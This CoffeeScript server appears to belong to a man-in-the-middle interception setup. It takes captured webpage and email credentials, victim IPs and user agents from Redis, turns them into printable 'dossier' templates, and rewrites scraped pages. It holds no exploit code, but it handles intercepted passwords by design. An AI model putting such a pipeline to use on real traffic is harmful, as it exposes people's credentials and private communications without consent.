subterfuge_image_loc = 'http://localhost:4000/static/scraper/images/'
subterfuge_css_loc = 'http://localhost:4000/static/scraper/css/'

express = require 'express'
#fs = require 'fs'
redis = require 'redis'
cheerio = require 'cheerio'
Handlebars = require 'handlebars'
Blacklist = require './blacklist'
fs = require 'fs'
request = require 'request'
Canvas = require 'canvas'
fav = require('fav')(Canvas)
httpGet = require('http-get')


app = express()
server = require('http').createServer app
io = require('socket.io').listen server

# ! Redis config

redisClient = redis.createClient(6379, "127.0.0.1")
redisClient2 = redis.createClient(6379, "127.0.0.1")
redisClient.on 'error', (err) ->
	console.log "REDIS ERROR: " + err

server.listen 3000

# express config

app.configure ->
  app.use express.static(__dirname + '/public')

# Handlebars and template setup
Templates = {}
hbTemplates = 
	'webpage_cover': 'webpage_cover.html'
	'webpage_credentials': 'webpage_credentials.html'
	'email_cover': 'email_cover.html'
	'email_credentials': 'email_credentials.html'

precompileTemplates = ->
	for name, path of hbTemplates
		do (name) ->
			fs.readFile __dirname + '/views/' + path, 'utf8', (err, data) ->
				if err then throw err
				Templates[name] = Handlebars.compile data

precompileTemplates()

# Sequence number for templates
sequenceNumber = fs.readFileSync(__dirname + '/seqnum', {encoding: 'utf-8'})
sequenceNumber = if sequenceNumber then parseInt(sequenceNumber) else 0

incSequenceNumber = ->
	sequenceNumber++
	fs.writeFile __dirname + '/seqnum', sequenceNumber
	sequenceNumber

# ! Socket shit

io.sockets.on 'connection', (socket) ->
	
	socket.on 'ping', ->
		socket.emit 'ready'

	socket.on 'scrape', (data) ->
		data = JSON.parse data
		pageTransformer = new PageTransformer data.page, data.host, data.fullUrl, data.title, data.encoding
		pageTransformer.run()


# Redis credential subscription
redisClient.subscribe 'new:credentials'
redisClient.subscribe 'new:mail'
redisClient.subscribe 'new:mail_credentials'
redisClient.on 'message', (channel, message) ->
	dataObj = JSON.parse message
	if dataObj
		if channel is 'new:credentials'
			new WebpageCredentialsTransformer(dataObj).publish()
		else if channel is 'new:mail_credentials'
			new EmailCredentialsTransformer(dataObj).publish()
		else if channel is 'new:mail'
			new EmailCoverTransformer(dataObj).publish()
			#credentialsObj.sequenceNumber = incSequenceNumber()
			#redisClient2.publish 'new:printable:credentials_' + credentialsObj.date, Templates.credentials(credentialsObj)



# ! Helpers

# ! --- TemplateTansformer ----------------------------------------------------

class TemplateTransformer
	type: null
	constructor: (@obj) ->
		@t = {}

		@t.DossierNr = incSequenceNumber()
		@t.Timestamp = (new Date(@obj.date)).toUTCString()

		@process()

	getTemplateKey: ->
		@type

	process: ->

	getPublishKey: ->
		'new:printable:' + @obj.date + '_' + @type

	stripHostname: (hostname) ->
		if hostname then hostname.replace('.fritz.box', '') else ''

	publish: ->
		console.log "Publishing printable data...s"
		redisClient2.publish @getPublishKey(), Templates[@getTemplateKey()](@t), redis.print


class WebpageTransformer extends TemplateTransformer
	process: ->
		super()
		@t.DestIp = @obj.DestIP
		@t.SrcIp = @obj.IP

class EmailTransformer extends WebpageTransformer
	process: ->
		super()
		


# ! --- Webpage Cover -----------------

class WebpageCoverTransformer extends WebpageTransformer
	type: 'webpage_cover'

	images: 
		android: 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4yLjEsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNTEycHgiIGhlaWdodD0iNTEycHgiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8Zz4NCgkJPHBhdGggZD0iTTM1MiwyMDh2NjAuNVYzNTdoLTIyLjVIMzEzdjE1LjVWNDI0YzAsNC40LTMsNy45LTcuMyw4bDAsMGwtMC4xLDBjLTAuMSwwLTAuMiwwLTAuMywwYy0xLjYsMC0zLjEtMC42LTQuMy0xLjZsLTAuMS0wLjENCgkJCWwtMC40LTAuMWMtMi0xLjYtMy40LTQtMy40LTYuMnYtNTEuNVYzNTdoLTE1LjVoLTQ5SDIxNnYxNS41VjQyNGMwLDQuNC0zLjYsOC04LDhzLTgtMy42LTgtOHYtNTEuNVYzNTdoLTE1LjVIMTYwdi04OC42VjIwOEgzNTINCgkJCSBNMzY4LDE5MkgxNDR2NzYuNFYzNThjMCw2LjksNS41LDE1LDEyLjQsMTVIMTg0djUxYzAsMTMuMywxMC43LDI0LDI0LDI0czI0LTEwLjcsMjQtMjR2LTUxaDQ5djUxYzAsNy41LDMuOSwxNC4yLDkuMywxOC42DQoJCQljMy45LDMuNCw5LjMsNS40LDE1LDUuNGMwLjEsMCwwLjMsMCwwLjQsMGMwLjEsMC0wLjMsMC0wLjIsMGMxMy4zLDAsMjMuNi0xMC43LDIzLjYtMjR2LTUxaDI4LjZjNywwLDEwLjQtOC4xLDEwLjQtMTQuOXYtODkuNg0KCQkJVjE5MkwzNjgsMTkyeiIvPg0KCQk8cGF0aCBkPSJNNDA4LDE5MmM0LjQsMCw4LDMuNiw4LDh2OTZjMCw0LjQtMy42LDgtOCw4cy04LTMuNi04LTh2LTk2QzQwMCwxOTUuNiw0MDMuNiwxOTIsNDA4LDE5MiBNNDA4LDE3NmMtMTMuMywwLTI0LDEwLjctMjQsMjQNCgkJCXY5NmMwLDEzLjMsMTAuNywyNCwyNCwyNHMyNC0xMC43LDI0LTI0di05NkM0MzIsMTg2LjcsNDIxLjMsMTc2LDQwOCwxNzZMNDA4LDE3NnoiLz4NCgkJPHBhdGggZD0iTTEwNCwxOTJjNC40LDAsOCwzLjYsOCw4djk2YzAsNC40LTMuNiw4LTgsOHMtOC0zLjYtOC04di05NkM5NiwxOTUuNiw5OS42LDE5MiwxMDQsMTkyIE0xMDQsMTc2Yy0xMy4zLDAtMjQsMTAuNy0yNCwyNA0KCQkJdjk2YzAsMTMuMywxMC43LDI0LDI0LDI0czI0LTEwLjcsMjQtMjR2LTk2QzEyOCwxODYuNywxMTcuMywxNzYsMTA0LDE3NkwxMDQsMTc2eiIvPg0KCTwvZz4NCgk8Zz4NCgkJPHBhdGggZD0iTTI1NSw5NC4zbDAuOSwwaDBoMGMxNC4yLDAsMjcuMywxLjksMzguOCw1LjZsMTAsNC40YzI4LjcsMTIuNiwzOS45LDM3LjQsNDQuNCw1NS43SDE2Mi44YzQuNC0xOC42LDE1LjYtNDMuNiw0NC4xLTU2DQoJCQlsMTAuMy00LjVDMjI4LjUsOTYuMSwyNDEuMiw5NC4zLDI1NSw5NC4zIE0xODUuNCw2NGMtMC41LDAtMS4yLDAuMi0xLjgsMC44Yy0xLjEsMC44LTEuNywxLjgtMS4zLDIuNWwxOC4zLDIyLjENCgkJCWMtNDguMiwyMC45LTU1LjQsNzEuNy01Ni40LDg2LjdoMjIzLjZjLTEuMS0xNS04LjItNjUuMS01Ni42LTg2LjRsMTguNS0yMi4yYzAuNC0wLjUtMC4yLTEuNy0xLjMtMi42Yy0wLjctMC41LTEuNS0wLjgtMi0wLjgNCgkJCWMtMC4zLDAtMC41LDAuMS0wLjcsMC4zbC0xOS4yLDIyLjdjLTEzLjYtNS40LTMwLjItOC44LTUwLjYtOC44Yy0wLjMsMC0wLjYsMC0xLDBjLTIwLDAtMzYuNCwzLjMtNDkuOCw4LjVsLTE5LTIyLjUNCgkJCUMxODYuMSw2NC4xLDE4NS44LDY0LDE4NS40LDY0TDE4NS40LDY0eiIvPg0KCTwvZz4NCjwvZz4NCjxwYXRoIGQ9Ik0yMDYuNiwxMzguOWMtNy40LDAtMTMuNS02LTEzLjUtMTMuM2MwLTcuMyw2LTEzLjMsMTMuNS0xMy4zYzcuNCwwLDEzLjUsNiwxMy41LDEzLjNDMjIwLjEsMTMyLjksMjE0LjEsMTM4LjksMjA2LjYsMTM4Ljl6DQoJIi8+DQo8cGF0aCBkPSJNMzA1LDEzOC45Yy03LjQsMC0xMy41LTYtMTMuNS0xMy4zYzAtNy4zLDYtMTMuMywxMy41LTEzLjNjNy40LDAsMTMuNSw2LDEzLjUsMTMuM0MzMTguNSwxMzIuOSwzMTIuNCwxMzguOSwzMDUsMTM4Ljl6Ii8+DQo8L3N2Zz4NCg=='
		apple: 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4yLjEsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNTEycHgiIGhlaWdodD0iNTEycHgiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8cGF0aCBkPSJNMzMzLjYsMTY5LjljMTYuMywwLDMzLjIsNy40LDQ3LjQsMjAuNGMtOS45LDguNS0xNy45LDE4LjctMjMuNywzMC4yYy04LDE2LTExLjYsMzQuMy0xMC4yLDUyLjcNCgkJYzEuMywxOC43LDcuNiwzNi42LDE4LDUxLjhjOCwxMS42LDE4LjIsMjEuMiwzMCwyOC4zYy01LDEwLjctOS4yLDE4LjQtMTYuOCwzMC41Yy04LjQsMTMuMS0zMC41LDQ4LTUyLDQ4LjJsLTAuNCwwDQoJCWMtNy40LDAtMTIuMi0yLjItMTkuMy01LjZjLTEwLTQuNy0yMi4zLTEwLjYtNDMuNC0xMC42bC0wLjYsMGMtMjEuMSwwLjEtMzMuOCw1LjktNDMuOSwxMC42Yy03LjQsMy40LTEyLjMsNS43LTE5LjksNS43bC0wLjQsMA0KCQljLTE5LjYtMC4yLTM3LjUtMjQuMy01MC44LTQ1LjJjLTE5LjMtMzAuNC0zMS43LTY1LjYtMzQuOS05OS4xYy0yLjktMzAuNSwyLTU4LjUsMTMuNS03Ni43YzgtMTIuNywxOC41LTIzLjMsMzAuNC0zMC42DQoJCWMxMS4yLTYuOCwyMy0xMC40LDM0LjItMTAuNGMxMi40LDAsMjIuNywzLjgsMzMuNyw3LjhjMTEuNSw0LjIsMjMuNSw4LjYsMzcuNyw4LjZjMTMuNiwwLDI0LjMtNC4yLDM0LjYtOC4yDQoJCUMzMDgsMTczLjksMzE4LjIsMTY5LjksMzMzLjYsMTY5LjkgTTMzMy42LDE1My45Yy0zMy42LDAtNDcuOCwxNi41LTcxLjIsMTYuNWMtMjQsMC00Mi4zLTE2LjQtNzEuNC0xNi40DQoJCWMtMjguNSwwLTU4LjksMTcuOS03OC4yLDQ4LjRjLTI3LjEsNDMtMjIuNSwxMjQsMjEuNCwxOTNjMTUuNywyNC43LDM2LjcsNTIuNCw2NC4yLDUyLjdjMC4yLDAsMC4zLDAsMC41LDANCgkJYzIzLjksMCwzMS0xNi4xLDYzLjktMTYuM2MwLjIsMCwwLjMsMCwwLjUsMGMzMi40LDAsMzguOSwxNi4yLDYyLjcsMTYuMmMwLjIsMCwwLjMsMCwwLjUsMGMyNy41LTAuMyw0OS42LTMxLDY1LjMtNTUuNg0KCQljMTEuMy0xNy43LDE1LjUtMjYuNiwyNC4yLTQ2LjZjLTYzLjUtMjQuOC03My43LTExNy40LTEwLjktMTUyLjlDMzg1LjksMTY4LjIsMzU5LDE1My45LDMzMy42LDE1My45TDMzMy42LDE1My45eiIvPg0KCTxwYXRoIGQ9Ik0zMDkuOSw4NC41Yy0yLjcsMTQuOS0xMC41LDI2LjgtMTQuNiwzMi4yYy03LjQsOS44LTE4LDE3LjQtMjguOCwyMS4xYzAuNS0zLDEuMy02LjEsMi40LTkuMmMzLjUtMTAuMiw4LjktMTguMiwxMi44LTIzLjENCgkJQzI4OC44LDk2LjcsMjk5LjMsODkuMSwzMDkuOSw4NC41IE0zMjYuMiw2NGMtMjAsMS40LTQzLjMsMTQuNS01NywzMS42Yy0xMi40LDE1LjUtMjIuNiwzOC41LTE4LjYsNjAuOGMwLjUsMCwxLDAsMS42LDANCgkJYzIxLjMsMCw0My4xLTEzLjIsNTUuOC0zMC4xQzMyMC4zLDExMC4yLDMyOS42LDg3LjQsMzI2LjIsNjRMMzI2LjIsNjR6Ii8+DQo8L2c+DQo8L3N2Zz4NCg=='
		windows: 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4yLjEsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNTEycHgiIGhlaWdodD0iNTEycHgiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8cGF0aCBkPSJNMTk5LjksMjgyLjd2MTA1LjVsLTAuOC0wLjFMOTUuOCwzNjcuM3YtODQuNkgxOTkuOSBNMjAyLjEsMjY2LjdIOTMuNGMtNy40LDAtMTMuNCw2LjEtMTMuNCwxMy43djg5DQoJCWMwLDYuNiw0LjYsMTEuOSwxMC43LDEzLjJsMTA1LjQsMjEuMWw2LjksMS4yYzctMC4zLDEyLjctNi40LDEyLjctMTMuNVYyODAuNEMyMTUuNywyNzIuNywyMDkuNSwyNjYuNywyMDIuMSwyNjYuN0wyMDIuMSwyNjYuN3oiDQoJCS8+DQoJPHBhdGggZD0iTTQxNi4yLDI4Mi43djE0Ny4ybC0yLjEsMS4xbC0xNjAuNC0zMmwtMS0wLjJ2LTExNkg0MTYuMiBNNDE4LjQsMjY2LjdIMjUwLjJjLTcuNCwwLTEzLjQsNi4xLTEzLjQsMTMuN3YxMjAuNXYwLjINCgkJYzAsNS41LDMuMywxMC4xLDcuOSwxMi4yYzAuMiwwLjIsMC4yLDAuMiwwLjIsMC4ybDUuMywxLjFjMC4yLDAsMC4yLDAsMC4zLDBsMTY0LjcsMzIuOWMwLjIsMC4xLDAuNSwwLjMsMC43LDAuMw0KCQljMC4xLDAsMC4yLDAsMC4zLTAuMWMwLjcsMC40LDEuNCwwLjQsMi4xLDAuNGM3LjQsMCwxMy42LTYsMTMuNi0xMy41VjI4MC40QzQzMiwyNzIuNyw0MjUuOCwyNjYuNyw0MTguNCwyNjYuN0w0MTguNCwyNjYuN3oiLz4NCgk8cGF0aCBkPSJNNDE0LDgxLjFsMi4xLDEuMXYxNDcuMkgyNTIuNnYtMTE2bDEtMC4yTDQxNCw4MS4xIE00MTguNCw2NGMtMC43LDAtMS40LDAtMi4xLDAuNGMtMC4xLTAuMS0wLjItMC4xLTAuMy0wLjENCgkJYy0wLjIsMC0wLjUsMC4xLTAuNywwLjNMMjUwLjUsOTcuNGMtMC4yLDAtMC4yLDAtMC4zLDBsLTUuMSwxLjFjMCwwLTAuMiwwLTAuNCwwLjJjLTQuNiwyLjEtNy45LDYuOS03LjksMTIuNHYxMjAuNQ0KCQljMCw3LjYsNiwxMy43LDEzLjQsMTMuN2gxNjguMmM3LjQsMCwxMy42LTYuMSwxMy42LTEzLjdWNzcuNUM0MzIsNzAuMSw0MjUuOCw2NCw0MTguNCw2NEw0MTguNCw2NHoiLz4NCgk8cGF0aCBkPSJNMTk5LjksMTIzLjl2MTA1LjVIOTUuOHYtODQuNkwxOTkuMSwxMjRMMTk5LjksMTIzLjkgTTIwMywxMDdsLTYuOSwxLjJMOTAuNywxMjkuNEM4NC42LDEzMC43LDgwLDEzNiw4MCwxNDIuNnY4OQ0KCQljMCw3LjYsNiwxMy43LDEzLjQsMTMuN2gxMDguOGM3LjQsMCwxMy42LTYuMSwxMy42LTEzLjdWMTIwLjVDMjE1LjcsMTEzLjQsMjEwLjEsMTA3LjQsMjAzLDEwN0wyMDMsMTA3eiIvPg0KPC9nPg0KPC9zdmc+DQo='

	process: ->
		super()
		console.log @obj
		console.log @t
		@t.FaviconSrc = @obj.faviconSrc
		@t.OsImage = @getOsImage()

		@t.Title = @obj.title
		@t.Link = @obj.fullUrl

		@t.HostName = @stripHostname @obj.Hostname
		@t.UAgent = @obj.UAgent

	getOsImage: ->
		os = ''
		uagent = @obj.UAgent
		if uagent
			os = 'android'  if uagent.indexOf('Android') isnt -1
			os = 'apple'  if uagent.indexOf('Mac') isnt -1
			os = 'windows' if uagent.indexOf('Win') isnt -1

		if @images[os] then @images[os] else ''


# ! --- Webpage Credentials -----------

class WebpageCredentialsTransformer extends WebpageTransformer
	type: 'webpage_credentials'

	process: ->
		super()
		@t.HostName = @obj.source
		@t.Value = @obj.username
		@t.Password = @obj.password


# ! --- Email Cover -------------------

class EmailCoverTransformer extends EmailTransformer
	type: 'email_cover'

	process: ->
		super()
		@t.Subject = @obj.subject
		@t.DestEmail = @obj.to
		@t.SrcEmail = @obj.from
		@t.HostName = @stripHostname @obj.hostname
		@t.UAgent = @obj.mailclient
		console.log @obj


# ! --- Email Credentials -------------

class EmailCredentialsTransformer extends EmailTransformer
	type: 'email_credentials'

	process: ->
		super()
		@t.HostName = @stripHostname @obj.hostname
		@t.UserName = @obj.username
		@t.Password = @obj.password
		console.log @obj




# ! --- PageTansformer --------------------------------------------------------

class PageTransformer
	constructor: (data, @host, @fullUrl, @title, @encoding) ->
		@html = '<!DOCTYPE html><html>' + data + '</html>'
		@$ = cheerio.load @html
		@timestamp = new Date().getTime()

	run: ->
		console.log Blacklist.do(@)
		unless Blacklist.do @
			@getConnectionInfos()
			@removeScripts()
			@changeImageSources()
			@changeCSSSources()
			@save()

	removeScripts: ->
		@$('script').remove()

	substituteSlashes: (selector, attrName, new_path) ->
		$ = @$
		that = @
		$(selector).each ->
			attr = $(@).attr attrName
			newHost = ''
			if attr
				if attr.indexOf('http://') isnt 0
					# no http, add host
					newHost = that.host + (if attr.indexOf('/') is 0 then '' else '/') + attr
				else
					newHost = attr.replace 'http://', ''
				# replace all slashes with underscores
				re = new RegExp '/', 'g'
				newHost = new_path + newHost.replace(re, '_')

				$(@).attr attrName, newHost


	changeImageSources: ->
		@substituteSlashes 'img', 'src', subterfuge_image_loc

	changeCSSSources: ->
		@substituteSlashes 'link[rel=stylesheet]', 'href', subterfuge_css_loc

	getFaviconSrc: (cb) ->
		possibleExtensions = ['ico', 'png', 'gif', 'jpg', 'jpeg']
		re = new RegExp '/', 'g'
		i = -1
		opts = 
			hostname: @host
			port: 80
			method: 'GET'
		checkAndContinue = =>
			i++

			if i <= possibleExtensions.length
				opts.path = '/favicon.' + possibleExtensions[i]
				uri = 'http://' + opts.hostname + opts.path
				uri_safe = uri.replace(re, '_')
				full_path = __dirname + '/favicons/' + uri_safe
				full_path_png = full_path + '.png'
				fs.exists full_path_png, (exists) ->
					if exists
						cb 'file://' + full_path_png
					else
						httpGet.get {url:uri}, full_path, (err, result) ->
							if (err)
								checkAndContinue()
							else
								try
									icon = fav(full_path).getLargest()
									icon.createPNGStream().pipe(fs.createWriteStream(full_path_png))
									cb('file://' + full_path_png)
								catch e
									console.log e
									checkAndContinue()
								fs.unlink(full_path)
						

			else
				cb null
		checkAndContinue()

			
	getConnectionInfos: ->
		$ = @$
		jsonTag = $('#mitm-scraper-conn-info')
		if jsonTag.length
			connInfo = JSON.parse jsonTag.html()
			connÍnfo = connInfo or {}
			connInfo.fullUrl = @fullUrl
			connInfo.title = @title
			# get the favicon and callback when necessary
			connInfo.date = @timestamp
			@getFaviconSrc (src) ->
				connInfo.faviconSrc = src
				new WebpageCoverTransformer(connInfo).publish()
					#@coverHtml = Templates.cover connInfo
					#redisClient2.publish 'new:printable:' + @timestamp + '_cover', @coverHtml, redis.print
			

	save: ->
		#console.log @$.html()
		publishName = 'new:printable:' + @timestamp + (if @encoding then '#' + @encoding else '')
		redisClient2.publish publishName, @$.html(), redis.print

